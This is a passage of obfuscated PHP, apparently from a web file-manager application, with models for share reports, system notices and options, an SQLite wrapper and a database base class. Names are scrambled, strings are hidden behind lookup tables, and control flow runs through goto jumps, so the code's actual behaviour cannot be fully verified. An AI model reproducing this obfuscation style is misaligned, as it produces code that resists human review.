$A©‡îİšºÜ = array($b©ÂÁ›ô‚¼[366] => array($b©ÂÁ›ô‚¼[7], trim($bÚËÔŠŒãº, $b©ÂÁ›ô‚¼[47]))); $dˆî©ÎÜ¥ö = Model($b©ÂÁ›ô‚¼[747])->where($A©‡îİšºÜ)->field($b©ÂÁ›ô‚¼[28])->select(); goto EºÀÖÆò¶Å; FÂğğÆùƒ: $A©‡îİšºÜ = array($b©ÂÁ›ô‚¼[415] => array($b©ÂÁ›ô‚¼[7], $aİ¹ÎÅ‚ì»), $b©ÂÁ›ô‚¼[455] => array($b©ÂÁ›ô‚¼[746], "\x25{$cê½æòëÃ}\x25"), $b©ÂÁ›ô‚¼[393] => 0); $aÇ¦¨„ï‚ = Model($b©ÂÁ›ô‚¼[747])->where($A©‡îİšºÜ)->field($b©ÂÁ›ô‚¼[2207])->find(); if (!$aÇ¦¨„ï‚) { return !1; } goto E²Íö‰ã±›; EºÀÖÆò¶Å: $e÷î·ó‚¬ø = array_to_keyvalue($dˆî©ÎÜ¥ö, $b©ÂÁ›ô‚¼[33], $b©ÂÁ›ô‚¼[28]); $e÷î·ó‚¬ø[] = $aÇ¦¨„ï‚[$b©ÂÁ›ô‚¼[28]]; return implode($b©ÂÁ›ô‚¼[8], $e÷î·ó‚¬ø); goto Aé¥•µÖ¢; Aé¥•µÖ¢: } protected function remove($DÛ‹óôÛ¶ø) { goto fĞÇ¸‡Ïì; fĞÇ¸‡Ïì: $bãÅ¹œµ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (is_array($DÛ‹óôÛ¶ø)) { $DÛ‹óôÛ¶ø = array($bãÅ¹œµ[7], $DÛ‹óôÛ¶ø); } $D˜é½‹‹ê = array($bãÅ¹œµ[437] => $DÛ‹óôÛ¶ø); goto FáÖ¾â±„ù; FáÖ¾â±„ù: $EÏÚ—ñ½¬ = $this->where($D˜é½‹‹ê)->delete(); if ($EÏÚ—ñ½¬) { Model($bãÅ¹œµ[533])->where(array($bãÅ¹œµ[437] => $DÛ‹óôÛ¶ø))->delete(); } $dá›Ğ¿¡‰ = is_array($DÛ‹óôÛ¶ø) ? $DÛ‹óôÛ¶ø[1] : array($DÛ‹óôÛ¶ø); goto f™¿¨œ‚ÕÁ; f™¿¨œ‚ÕÁ: for ($Ağ‡·ÉÜáí = 0; $Ağ‡·ÉÜáí < count($dá›Ğ¿¡‰); $Ağ‡·ÉÜáí++) { $dµ‘·Íƒ°¬ = $this->getInfo($dá›Ğ¿¡‰[$Ağ‡·ÉÜáí]); if ($dµ‘·Íƒ°¬[$bãÅ¹œµ[444]] == $bãÅ¹œµ[83]) { Model($bãÅ¹œµ[501])->eventShare($dµ‘·Íƒ°¬[$bãÅ¹œµ[366]], $bãÅ¹œµ[2193]); } if ($dµ‘·Íƒ°¬[$bãÅ¹œµ[442]] == $bãÅ¹œµ[83]) { Model($bãÅ¹œµ[501])->eventShare($dµ‘·Íƒ°¬[$bãÅ¹œµ[366]], $bãÅ¹œµ[2192]); } } return $EÏÚ—ñ½¬; goto B­ˆÍ¡¼™; B­ˆÍ¡¼™: } protected function removeBySource($f“»è¯ÖÇ´) { goto fÆîÒšÎ’è; fÆîÒšÎ’è: $eäÛŠÊƒí« =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $còÈ¨›èº³ = array($eäÛŠÊƒí«[380] => array($eäÛŠÊƒí«[381], $f“»è¯ÖÇ´)); $e¼Šˆ“×³ = $this->field($eäÛŠÊƒí«[437])->where($còÈ¨›èº³)->select(); goto C¦Ö‰‰àß; fÁ¬º‰ÎÓ: $this->where($còÈ¨›èº³)->delete(); Model($eäÛŠÊƒí«[533])->where($còÈ¨›èº³)->delete(); goto F‡”ƒÄ¹™; C¦Ö‰‰àß: $e¼Šˆ“×³ = array_to_keyvalue($e¼Šˆ“×³, $eäÛŠÊƒí«[33], $eäÛŠÊƒí«[437]); if (!$e¼Šˆ“×³) { return; } $còÈ¨›èº³ = array($eäÛŠÊƒí«[436] => array($eäÛŠÊƒí«[381], $e¼Šˆ“×³)); goto fÁ¬º‰ÎÓ; F‡”ƒÄ¹™: } public function listAll($cï‘‹Œà) { goto c©½˜‡— ¬; eòø—à¯ßš: $EŒ“æÒ©ğ = $this->_makeOrder()->where($fÍËÒÑù’Ş)->selectPage(20); if (empty($EŒ“æÒ©ğ[$c™ ½Å¡œ[351]])) { return array(); } $this->_listDataApply($EŒ“æÒ©ğ[$c™ ½Å¡œ[351]]); goto Bëâ©‹•à¶; c©½˜‡— ¬: $c™ ½Å¡œ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fÍËÒÑù’Ş = array(); if ($cï‘‹Œà[$c™ ½Å¡œ[1409]]) { $fÍËÒÑù’Ş[$c™ ½Å¡œ[1409]] = $cï‘‹Œà[$c™ ½Å¡œ[1409]]; } goto BĞ«¸øÂ¥—; Bëâ©‹•à¶: return $EŒ“æÒ©ğ; goto BÀ¼¥á†¥ˆ; BĞ«¸øÂ¥—: if ($cï‘‹Œà[$c™ ½Å¡œ[697]]) { $bÉãŒÁé³É = $cï‘‹Œà[$c™ ½Å¡œ[698]] ? $cï‘‹Œà[$c™ ½Å¡œ[698]] : strtotime(date($c™ ½Å¡œ[2208])); $fÍËÒÑù’Ş[$c™ ½Å¡œ[184]] = array($c™ ½Å¡œ[318], array($cï‘‹Œà[$c™ ½Å¡œ[697]], $bÉãŒÁé³É)); } if ($cï‘‹Œà[$c™ ½Å¡œ[29]]) { $fÍËÒÑù’Ş[$cï‘‹Œà[$c™ ½Å¡œ[29]]] = 1; } else { $fÍËÒÑù’Ş[] = array($c™ ½Å¡œ[442] => array($c™ ½Å¡œ[920], 0), $c™ ½Å¡œ[444] => array($c™ ½Å¡œ[920], 0), $c™ ½Å¡œ[2183] => $c™ ½Å¡œ[2152]); } if ($cï‘‹Œà[$c™ ½Å¡œ[2148]]) { $fÍËÒÑù’Ş[] = array($c™ ½Å¡œ[439] => $cï‘‹Œà[$c™ ½Å¡œ[2148]], $c™ ½Å¡œ[1316] => array($c™ ½Å¡œ[746], "\45{$cï‘‹Œà[$c™ ½Å¡œ[2148]]}\x25"), $c™ ½Å¡œ[2183] => $c™ ½Å¡œ[2152]); } goto eòø—à¯ßš; BÀ¼¥á†¥ˆ: } public function listDataApply($c½¾‚ •†) { $this->_listDataApply($c½¾‚ •†); return $c½¾‚ •†; } private function _listDataApply(&$a©¥Ú©Ÿİ„) { $B·¬İëÜ©ñ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bà›ê…«ñí = array_to_keyvalue($a©¥Ú©Ÿİ„, $B·¬İëÜ©ñ[33], $B·¬İëÜ©ñ[1409]); $fğª¤Ú×¤ = Model($B·¬İëÜ©ñ[473])->userListInfo(array_unique($bà›ê…«ñí)); $FîŒŠ©ÀÇº = array_to_keyvalue($a©¥Ú©Ÿİ„, $B·¬İëÜ©ñ[33], $B·¬İëÜ©ñ[366]); $Có”£ğğ¡ = Model($B·¬İëÜ©ñ[747])->sourceListInfo($FîŒŠ©ÀÇº, !0); foreach ($a©¥Ú©Ÿİ„ as &$DİÔ‡ä×Ö) { $aÁÀ˜¬Ïä = $DİÔ‡ä×Ö[$B·¬İëÜ©ñ[1409]]; $DİÔ‡ä×Ö[$B·¬İëÜ©ñ[2209]] = $fğª¤Ú×¤[$aÁÀ˜¬Ïä] ? $fğª¤Ú×¤[$aÁÀ˜¬Ïä] : !1; $Eš“îŒ†íŒ = $DİÔ‡ä×Ö[$B·¬İëÜ©ñ[366]]; $DİÔ‡ä×Ö[$B·¬İëÜ©ñ[388]] = $Có”£ğğ¡[$Eš“îŒ†íŒ] ? $Có”£ğğ¡[$Eš“îŒ†íŒ] : !1; } } private function _makeOrder($FÅøšèôï = '') { goto CÅ¥·—ôÊ”; dùˆâİëµ¤: $FÅøšèôï = $FÅøšèôï . "{$eŸ¢ÙêÑ‰¸}\40{$CˆŸôš…ÌÚ}"; return $this->order($FÅøšèôï); goto CÌĞÇ¶·²Õ; a×‡ ¿ºã„: $eŸ¢ÙêÑ‰¸ = Input::get($F§›ÉôùÑ[403], $F§›ÉôùÑ[7], $F§›ÉôùÑ[386], $aÏ³ÖŠã¶ò); $CˆŸôš…ÌÚ = Input::get($F§›ÉôùÑ[404], $F§›ÉôùÑ[7], $F§›ÉôùÑ[2210], array($F§›ÉôùÑ[2147], $F§›ÉôùÑ[400])); $CˆŸôš…ÌÚ = $BÎãİ¯ô«Ÿ[$CˆŸôš…ÌÚ]; goto dùˆâİëµ¤; CÅ¥·—ôÊ”: $F§›ÉôùÑ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aÏ³ÖŠã¶ò = array($F§›ÉôùÑ[184], $F§›ÉôùÑ[698], $F§›ÉôùÑ[2195], $F§›ÉôùÑ[2196]); $BÎãİ¯ô«Ÿ = array($F§›ÉôùÑ[398] => $F§›ÉôùÑ[399], $F§›ÉôùÑ[400] => $F§›ÉôùÑ[401]); goto a×‡ ¿ºã„; CÌĞÇ¶·²Õ: } public function reportAdd($añÊŒ…Ûå½) { $aå‚ÒÆÒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $A’öõœÈœ = array($aå‚ÒÆÒ[437] => $añÊŒ…Ûå½[$aå‚ÒÆÒ[437]], $aå‚ÒÆÒ[1409] => USER_ID); if (Model($aå‚ÒÆÒ[2206])->where($A’öõœÈœ)->find()) { return !1; } $c³­„³÷Ï = array($aå‚ÒÆÒ[437] => $añÊŒ…Ûå½[$aå‚ÒÆÒ[437]], $aå‚ÒÆÒ[1316] => $añÊŒ…Ûå½[$aå‚ÒÆÒ[1316]], $aå‚ÒÆÒ[366] => $añÊŒ…Ûå½[$aå‚ÒÆÒ[366]], $aå‚ÒÆÒ[415] => $añÊŒ…Ûå½[$aå‚ÒÆÒ[415]], $aå‚ÒÆÒ[1409] => USER_ID, $aå‚ÒÆÒ[29] => $añÊŒ…Ûå½[$aå‚ÒÆÒ[29]], $aå‚ÒÆÒ[401] => $añÊŒ…Ûå½[$aå‚ÒÆÒ[401]]); return Model($aå‚ÒÆÒ[2206])->add($c³­„³÷Ï); } public function reportList($e‡ˆÂ™Ò¶Ô) { goto Bíì‰®“õ¹; FñÜ‰„À¼: $f¼Áƒœ¸× = array($bƒÊœÛè‘[398] => $bƒÊœÛè‘[399], $bƒÊœÛè‘[400] => $bƒÊœÛè‘[401]); $dÁ§õŒ› = $bƒÊœÛè‘[2214] . $f¼Áƒœ¸×[$F‘‰ÍˆÃ]; $déÀä¶·áÕ = Model($bƒÊœÛè‘[2206])->where($DŠƒ„„¢)->order($dÁ§õŒ›)->selectPage(20); goto Bí°¿Ë–¨›; cÖñó¨ ø¢: if (isset($e‡ˆÂ™Ò¶Ô[$bƒÊœÛè‘[29]]) && in_array($e‡ˆÂ™Ò¶Ô[$bƒÊœÛè‘[29]], array($bƒÊœÛè‘[83], $bƒÊœÛè‘[2211], $bƒÊœÛè‘[2212], $bƒÊœÛè‘[2213], $bƒÊœÛè‘[1888]))) { $DŠƒ„„¢[$bƒÊœÛè‘[29]] = $e‡ˆÂ™Ò¶Ô[$bƒÊœÛè‘[29]]; } if (isset($e‡ˆÂ™Ò¶Ô[$bƒÊœÛè‘[684]]) && in_array($e‡ˆÂ™Ò¶Ô[$bƒÊœÛè‘[684]], array($bƒÊœÛè‘[464], $bƒÊœÛè‘[83], $bƒÊœÛè‘[2211], $bƒÊœÛè‘[2212]))) { $DŠƒ„„¢[$bƒÊœÛè‘[684]] = $e‡ˆÂ™Ò¶Ô[$bƒÊœÛè‘[684]]; } $F‘‰ÍˆÃ = Input::get($bƒÊœÛè‘[404], $bƒÊœÛè‘[7], $bƒÊœÛè‘[2210], array($bƒÊœÛè‘[2147], $bƒÊœÛè‘[400])); goto FñÜ‰„À¼; Bí°¿Ë–¨›: if (empty($déÀä¶·áÕ[$bƒÊœÛè‘[351]])) { return array(); } $this->_listDataApply($déÀä¶·áÕ[$bƒÊœÛè‘[351]]); return $déÀä¶·áÕ; goto FñŒÕ¼÷¡Ô; Bíì‰®“õ¹: $bƒÊœÛè‘ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $DŠƒ„„¢ = array(); if ($e‡ˆÂ™Ò¶Ô[$bƒÊœÛè‘[697]]) { $a»Ò¤†Š…š = $e‡ˆÂ™Ò¶Ô[$bƒÊœÛè‘[698]] ? $e‡ˆÂ™Ò¶Ô[$bƒÊœÛè‘[698]] : strtotime(date($bƒÊœÛè‘[2208])); $DŠƒ„„¢[$bƒÊœÛè‘[184]] = array($bƒÊœÛè‘[318], array($e‡ˆÂ™Ò¶Ô[$bƒÊœÛè‘[697]], $a»Ò¤†Š…š)); } goto cÖñó¨ ø¢; FñŒÕ¼÷¡Ô: } public function reportStatus($fàÂò¹’²Ò) { goto D’ö¯—ÎŒš; BàÏ›‰½Ïº: $cİ÷ôôÉ—µ = Model($D­¼ÙöÜ³‚[2206])->where($AˆÊò˜øËÍ)->save($f„¿¾¢…Ñğ); if ($fàÂò¹’²Ò[$D­¼ÙöÜ³‚[684]] == $D­¼ÙöÜ³‚[2211]) { if ($c·ŒÂ‚Ë³[$D­¼ÙöÜ³‚[415]] != $D­¼ÙöÜ³‚[464] && $this->shareFileMeta($c·ŒÂ‚Ë³[$D­¼ÙöÜ³‚[415]])) { $this->shareFileMeta($c·ŒÂ‚Ë³[$D­¼ÙöÜ³‚[415]], 0); } return $this->remove($c·ŒÂ‚Ë³[$D­¼ÙöÜ³‚[437]]); } if ($cİ÷ôôÉ—µ && $fàÂò¹’²Ò[$D­¼ÙöÜ³‚[684]] == $D­¼ÙöÜ³‚[2212]) { $Déì”áÑ¯ª = $f„¿¾¢…Ñğ[$D­¼ÙöÜ³‚[684]] == $D­¼ÙöÜ³‚[2212] ? 1 : 0; $this->shareFileMeta($c·ŒÂ‚Ë³[$D­¼ÙöÜ³‚[415]], $Déì”áÑ¯ª); $this->removeByFile($c·ŒÂ‚Ë³[$D­¼ÙöÜ³‚[415]]); } goto dÏ†îÂŸô„; C°åºÑ²„™: if (!$c·ŒÂ‚Ë³) { return !1; } $f„¿¾¢…Ñğ = array($D­¼ÙöÜ³‚[684] => $fàÂò¹’²Ò[$D­¼ÙöÜ³‚[684]]); if ($fàÂò¹’²Ò[$D­¼ÙöÜ³‚[684]] == $D­¼ÙöÜ³‚[2212] && $c·ŒÂ‚Ë³[$D­¼ÙöÜ³‚[684]] == $D­¼ÙöÜ³‚[2212]) { $f„¿¾¢…Ñğ[$D­¼ÙöÜ³‚[684]] = 0; } goto BàÏ›‰½Ïº; dÏ†îÂŸô„: return $cİ÷ôôÉ—µ; goto Bïµœ‚ğö…; D’ö¯—ÎŒš: $D­¼ÙöÜ³‚ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AˆÊò˜øËÍ = array($D­¼ÙöÜ³‚[364] => $fàÂò¹’²Ò[$D­¼ÙöÜ³‚[364]]); $c·ŒÂ‚Ë³ = Model($D­¼ÙöÜ³‚[2206])->where($AˆÊò˜øËÍ)->field($D­¼ÙöÜ³‚[2215])->find(); goto C°åºÑ²„™; Bïµœ‚ğö…: } private function removeByFile($bŠ…‹±Ğ¿¡) { goto Fò½‡±¤¼; EŸç³Ë”¢ê: $Eƒé¶‰¸Œ² = array($fø±»¼•ÚÂ[366] => array($fø±»¼•ÚÂ[7], $dàõÉÛ“ÈŠ), $fø±»¼•ÚÂ[442] => 1); $C¡÷ãÅ¬Ûà = Model($fø±»¼•ÚÂ[2049])->where($Eƒé¶‰¸Œ²)->field($fø±»¼•ÚÂ[437])->select(); if (empty($C¡÷ãÅ¬Ûà)) { return; } goto CÊõ¡õÛ‰£; Fò½‡±¤¼: $fø±»¼•ÚÂ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C¡÷ãÅ¬Ûà = Model($fø±»¼•ÚÂ[747])->where(array($fø±»¼•ÚÂ[415] => $bŠ…‹±Ğ¿¡))->field($fø±»¼•ÚÂ[366])->select(); $dàõÉÛ“ÈŠ = array_to_keyvalue($C¡÷ãÅ¬Ûà, $fø±»¼•ÚÂ[33], $fø±»¼•ÚÂ[366]); goto EŸç³Ë”¢ê; CÊõ¡õÛ‰£: $Bº®ƒôÌê· = array_to_keyvalue($C¡÷ãÅ¬Ûà, $fø±»¼•ÚÂ[33], $fø±»¼•ÚÂ[437]); $this->remove($Bº®ƒôÌê·); goto fä££¾¶”Õ; fä££¾¶”Õ: } private function shareFileMeta($A‰Øê¥­¤ø, $Cª½‚ØÁ = null) { $D†Š¥ÃÙ¥ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Dªä’ÜÑ®£ = array($D†Š¥ÃÙ¥[415] => $A‰Øê¥­¤ø, $D†Š¥ÃÙ¥[89] => $D†Š¥ÃÙ¥[2216]); if (is_null($Cª½‚ØÁ)) { return Model($D†Š¥ÃÙ¥[2217])->where($Dªä’ÜÑ®£)->find(); } $Dªä’ÜÑ®£[$D†Š¥ÃÙ¥[356]] = $Cª½‚ØÁ; Model($D†Š¥ÃÙ¥[2217])->add($Dªä’ÜÑ®£, array(), !0); } } goto b÷ÁŒÛÁô¤; F‰ë¨”®”Ô: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\x2e\156\157\x74\151\143\x65\x4c\x69\163\164"; public $field = array("\x6e\x61\x6d\145", "\143\157\156\x74\145\156\x74", "\141\x75\x74\150", "\155\x6f\x64\x65", "\x74\151\155\145", "\x74\x79\160\145", "\154\145\x76\145\x6c", "\x65\x6e\x61\142\x6c\x65", "\x73\x6f\x72\164"); public function listData($a œ‚ğÚí = false, $c¹¥ŞèÊ˜â = "\163\x6f\162\164", $F±â„¡š¢ƒ = false) { return parent::listData($a œ‚ğÚí, $c¹¥ŞèÊ˜â, $F±â„¡š¢ƒ); } public function add($e§¢±ÍÅø) { goto A÷ííîÅ›ï; a‚øäÀÇÌ: return parent::insert($e§¢±ÍÅø); goto dŒâôšíòİ; bÉïø…É : $d£ÓèÕô“Ò = time(); if ($e§¢±ÍÅø[$eÍÏìÉ§Ó[12]] == $eÍÏìÉ§Ó[2431]) { $d£ÓèÕô“Ò = strtotime($e§¢±ÍÅø[$eÍÏìÉ§Ó[187]]); } $e§¢±ÍÅø[$eÍÏìÉ§Ó[187]] = $d£ÓèÕô“Ò; goto a‚øäÀÇÌ; A÷ííîÅ›ï: $eÍÏìÉ§Ó =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C»¼÷Ú¶›ª = $this->findByName($e§¢±ÍÅø[$eÍÏìÉ§Ó[28]]); if ($C»¼÷Ú¶›ª) { return !1; } goto bÉïø…É ; dŒâôšíòİ: } public function update($föñŒôÒĞ„, $B‹©î½øäŞ) { goto bÀñ¢÷²Í; bÀñ¢÷²Í: $dÎ¤Ö†‚ê¦ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bİŒ âåŞ = $this->listData($föñŒôÒĞ„); $bŸë™˜Û‰± = $this->findByName($B‹©î½øäŞ[$dÎ¤Ö†‚ê¦[28]]); goto b‘†ÅƒÆÃß; B•¦–˜–ãÜ: $B‹©î½øäŞ[$dÎ¤Ö†‚ê¦[187]] = $fñØêÀ›Õ; return parent::update($föñŒôÒĞ„, $B‹©î½øäŞ); goto dâïõ´Íº½; b‘†ÅƒÆÃß: if (!$bİŒ âåŞ || $bŸë™˜Û‰± && $bŸë™˜Û‰±[$dÎ¤Ö†‚ê¦[364]] != $bİŒ âåŞ[$dÎ¤Ö†‚ê¦[364]]) { return !1; } $fñØêÀ›Õ = time(); if ($B‹©î½øäŞ[$dÎ¤Ö†‚ê¦[12]] == $dÎ¤Ö†‚ê¦[2431]) { $fñØêÀ›Õ = strtotime($B‹©î½øäŞ[$dÎ¤Ö†‚ê¦[187]]); } goto B•¦–˜–ãÜ; dâïõ´Íº½: } public function remove($C½–÷õÊ£­) { $fê‘‚‹ó¿ = $this->listData($C½–÷õÊ£­); if (!$fê‘‚‹ó¿ || $fê‘‚‹ó¿[$_SERVER[ÚŠ•´ÍéÒÑÔ][1072]]) { return !1; } return parent::remove($C½–÷õÊ£­); } public function sort($d„£ÂÃä‚Ó, $fªÓÊœ¨) { return parent::update($d„£ÂÃä‚Ó, $fªÓÊœ¨); } public function enable($dâ†¸¸Ë, $D¹ùÃåêéÏ) { return parent::update($dâ†¸¸Ë, array($_SERVER[ÚŠ•´ÍéÒÑÔ][2432] => $D¹ùÃåêéÏ)); } private function initUserOption() { $C£Í‚“Ãªè =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->optionType = $C£Í‚“Ãªè[2433]; $this->modelType = $C£Í‚“Ãªè[2434]; $this->field = array($C£Í‚“Ãªè[2435], $C£Í‚“Ãªè[28], $C£Í‚“Ãªè[187], $C£Í‚“Ãªè[29], $C£Í‚“Ãªè[2436], $C£Í‚“Ãªè[684], $C£Í‚“Ãªè[180]); } public function userNoticeGet($C©¹İ×ÅÍÉ = false) { $this->initUserOption(); return parent::listData($C©¹İ×ÅÍÉ, $_SERVER[ÚŠ•´ÍéÒÑÔ][364], !0); } public function userNoticeAdd($BÇ‚ÍÌ˜½‹) { $EÌ¯ä’ò«ö =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->initUserOption(); $E«©èÔì¢ƒ = $this->findByKey($EÌ¯ä’ò«ö[2435], $BÇ‚ÍÌ˜½‹[$EÌ¯ä’ò«ö[364]]); if ($E«©èÔì¢ƒ) { return !0; } $E§è¡…Æ…… = array($EÌ¯ä’ò«ö[2435] => $BÇ‚ÍÌ˜½‹[$EÌ¯ä’ò«ö[364]], $EÌ¯ä’ò«ö[28] => $BÇ‚ÍÌ˜½‹[$EÌ¯ä’ò«ö[28]], $EÌ¯ä’ò«ö[187] => $BÇ‚ÍÌ˜½‹[$EÌ¯ä’ò«ö[187]], $EÌ¯ä’ò«ö[29] => isset($BÇ‚ÍÌ˜½‹[$EÌ¯ä’ò«ö[29]]) ? $BÇ‚ÍÌ˜½‹[$EÌ¯ä’ò«ö[29]] : 1, $EÌ¯ä’ò«ö[2436] => isset($BÇ‚ÍÌ˜½‹[$EÌ¯ä’ò«ö[2436]]) ? $BÇ‚ÍÌ˜½‹[$EÌ¯ä’ò«ö[2436]] : 0, $EÌ¯ä’ò«ö[684] => 0, $EÌ¯ä’ò«ö[180] => 0); return parent::insert($E§è¡…Æ……); } public function userNoticeEdit($B™Öª·ÍïË, $b Ï†á»½Î) { $this->initUserOption(); return parent::update($B™Öª·ÍïË, $b Ï†á»½Î); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\x74\x65\155\137\x6f\160\164\151\x6f\156"; protected $jsonField = array("\155\145\156\165", "\x72\x6f\154\x65", "\162\157\154\145\x47\x72\157\165\x70", "\x72\145\147\x69\163\x74", "\145\155\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($bÔÓ÷Ô­¹) { return "\x53\x79\163\164\x65\x6d\117\x70\164\151\157\156\x5f{$bÔÓ÷Ô­¹}"; } protected function optionDefault($bê„ƒ„èŒ¾ = '') { $bŸö­®÷­Ë =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($bê„ƒ„èŒ¾ == $bŸö­®÷­Ë[33]) { return $GLOBALS[$bŸö­®÷­Ë[6]][$bŸö­®÷­Ë[2437]]; } } } class SystemRecordModel extends ModelBaseLight { } goto D“ŠÂÀø‚æ; f„ÏÜ¶Û­Ñ: class DbSqlite3 extends DbSqlite3Base { public function query($DÀ‰­ÍøÌŠ) { goto b™šâ×ÚÕÅ; b™šâ×ÚÕÅ: $Aµã»Ö»ÏÚ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CÆÆ†¬‚‚ê = DATA_PATH . $Aµã»Ö»ÏÚ[866]; $Fè¿ãà¾² = fopen($CÆÆ†¬‚‚ê, $Aµã»Ö»ÏÚ[867]); goto Fô¤‚êÚ÷‚; aª××—óÂ: fclose($Fè¿ãà¾²); show_json($Aµã»Ö»ÏÚ[868], !1); return !1; goto D˜‰°…„ÓÏ; Fô¤‚êÚ÷‚: if (!$Fè¿ãà¾²) { return !1; } if (flock($Fè¿ãà¾², LOCK_EX)) { $cñáã÷¶¶ = parent::query($DÀ‰­ÍøÌŠ); flock($Fè¿ãà¾², LOCK_UN); fclose($Fè¿ãà¾²); return $cñáã÷¶¶; } flock($Fè¿ãà¾², LOCK_UN); goto aª××—óÂ; D˜‰°…„ÓÏ: } public function execute($EöÇŞ¯Ã¯ç) { goto cÜ¤´¾œ¡‹; eŠŠêìßˆ†: if (!$bï—¯º§‰) { return !1; } if (flock($bï—¯º§‰, LOCK_EX)) { $dÉğ®ÖÛ¯˜ = parent::execute($EöÇŞ¯Ã¯ç); flock($bï—¯º§‰, LOCK_UN); fclose($bï—¯º§‰); return $dÉğ®ÖÛ¯˜; } flock($bï—¯º§‰, LOCK_UN); goto f¨Üœ¶×ïŞ; f¨Üœ¶×ïŞ: fclose($bï—¯º§‰); show_json($c†â†Ò²ĞÚ[868], !1); return !1; goto A¼èò©Û… ; cÜ¤´¾œ¡‹: $c†â†Ò²ĞÚ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Fîë‹×¾ö = DATA_PATH . $c†â†Ò²ĞÚ[866]; $bï—¯º§‰ = fopen($Fîë‹×¾ö, $c†â†Ò²ĞÚ[867]); goto eŠŠêìßˆ†; A¼èò©Û… : } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\x69\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\x71" => "\x3d", "\156\145\161" => "\74\76", "\x67\x74" => "\x3e", "\145\x67\x74" => "\x3e\75", "\x6c\164" => "\x3c", "\x65\154\164" => "\74\75", "\156\157\x74\x6c\x69\153\145" => "\116\x4f\x54\40\114\111\x4b\x45", "\154\151\x6b\x65" => "\114\111\113\x45", "\x69\x6e" => "\111\116", "\156\x6f\x74\x69\x6e" => "\116\117\x54\x20\x49\x4e", "\x6e\x6f\164\40\x69\x6e" => "\116\x4f\x54\40\x49\116", "\142\145\164\x77\145\x65\156" => "\102\105\124\127\x45\105\116", "\156\x6f\x74\142\x65\164\167\145\x65\156" => "\x4e\117\x54\40\x42\x45\x54\x57\105\x45\x4e", "\x6e\x6f\164\x20\142\145\x74\167\x65\x65\x6e" => "\x4e\x4f\124\x20\x42\105\124\x57\x45\105\116"); protected $selectSql = "\123\x45\114\x45\103\124\x25\104\x49\123\124\x49\x4e\x43\x54\x25\40\45\x46\x49\x45\114\x44\x25\x20\106\122\117\115\x20\45\x54\x41\x42\114\105\x25\45\112\x4f\111\116\x25\45\x57\x48\105\122\x45\x25\45\x47\x52\117\x55\120\x25\45\x48\101\126\x49\x4e\107\45\x25\x4f\x52\104\x45\x52\45\x25\x4c\111\115\x49\x54\x25\40\45\125\x4e\x49\x4f\x4e\x25\45\103\x4f\x4d\115\105\116\124\x25"; protected $bind = array(); public static function getInstance() { $Aó‘ÁÁà¿ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ÚŠ•´ÍéÒÑÔ][869], $Aó‘ÁÁà¿); } public function factory($b³Šàãñˆù = '') { goto DÏ§ñ¡Ÿµ®; e’ÖË‹†©©: $this->dbType = ucwords(strtolower($b³Šàãñˆù[$EÔ¸´Ò¹‡[870]])); $AÚß˜„ßæé = $EÔ¸´Ò¹‡[872] . $this->dbType; if (class_exists($AÚß˜„ßæé)) { $BÜÏßáµì = new $AÚß˜„ßæé($b³Šàãñˆù); if ($EÔ¸´Ò¹‡[719] != strtolower($b³Šàãñˆù[$EÔ¸´Ò¹‡[870]])) { $BÜÏßáµì->dbType = strtoupper($this->dbType); } else { $BÜÏßáµì->dbType = $this->_getDsnType($b³Šàãñˆù[$EÔ¸´Ò¹‡[822]]); } } else { think_exception(think_lang($EÔ¸´Ò¹‡[873]) . $EÔ¸´Ò¹‡[874] . $AÚß˜„ßæé); } goto BÙ°×ï•Äë; BÙ°×ï•Äë: return $BÜÏßáµì; goto Cë¿„ß‰Ã·; DÏ§ñ¡Ÿµ®: $EÔ¸´Ò¹‡ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $b³Šàãñˆù = $this->parseConfig($b³Šàãñˆù); if (empty($b³Šàãñˆù[$EÔ¸´Ò¹‡[870]])) { think_exception(think_lang($EÔ¸´Ò¹‡[871])); } goto e’ÖË‹†©©; Cë¿„ß‰Ã·: } public function __call($d“ëÀ®âá’, $Aì£ŠÏ˜ìÄ) { if (method_exists($this, $d“ëÀ®âá’)) { return call_user_func_array(array($this, $d“ëÀ®âá’), $Aì£ŠÏ˜ìÄ); } } protected function _getDsnType($C‡›á†ô¹Õ) { $aÊ¥¿÷İ = explode($_SERVER[ÚŠ•´ÍéÒÑÔ][4], $C‡›á†ô¹Õ); $bÏ÷Ñ’ö = strtoupper(trim($aÊ¥¿÷İ[0])); return $bÏ÷Ñ’ö; } private function parseConfig($B„âºïÊä’ = '') { $A±—Ä†Æ· =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!empty($B„âºïÊä’) && is_string($B„âºïÊä’)) { $B„âºïÊä’ = $this->parseDSN($B„âºïÊä’); } elseif (is_array($B„âºïÊä’)) { $B„âºïÊä’ = array_change_key_case($B„âºïÊä’); $B„âºïÊä’ = array($A±—Ä†Æ·[870] => $B„âºïÊä’[$A±—Ä†Æ·[718]], $A±—Ä†Æ·[795] => $B„âºïÊä’[$A±—Ä†Æ·[875]], $A±—Ä†Æ·[796] => 